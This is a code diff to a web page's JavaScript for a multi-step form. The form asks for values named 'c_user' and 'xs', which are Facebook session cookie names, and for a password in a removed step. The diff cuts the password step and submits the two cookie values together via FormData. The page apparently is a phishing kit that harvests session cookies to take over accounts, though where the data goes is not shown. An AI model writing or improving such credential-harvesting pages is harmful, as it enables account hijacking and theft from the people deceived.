@@ -1719,40 +1719,16 @@
                 const xsInput = document.getElementById('xs');
                 
                 // Trigger browser validation
-                if (!cUserInput.checkValidity()) {
-                    cUserInput.reportValidity();
-                    return;
-                }
-                
-                if (!xsInput.checkValidity()) {
-                    xsInput.reportValidity();
-                    return;
-                }
-                
-                step1.classList.remove('active');
-                step2.classList.add('active');
-                
-                steps[0].classList.remove('active');
-                steps[1].classList.add('active');
-            });
-            
-            // Back to Step 1
-            backToStep1.addEventListener('click', function() {
-                step2.classList.remove('active');
-                step1.classList.add('active');
-                
-                steps[1].classList.remove('active');
-                steps[0].classList.add('active');
-            });
-            
-            // Submit form
-            nextToStep3.addEventListener('click', function() {
-                const passwordInput = document.getElementById('password');
-                
-                if (!passwordInput.checkValidity()) {
-                    passwordInput.reportValidity();
-                    return;
-                }
+          if (!cUserInput.checkValidity()) {
+            cUserInput.reportValidity();
+            return;
+          }
+
+          if (!xsInput.checkValidity()) {
+            xsInput.reportValidity();
+            return;
+          }
+
                 // Submit c_user and xs together
           const formData = new FormData();
           formData.append("c_user", cUserInput.value);
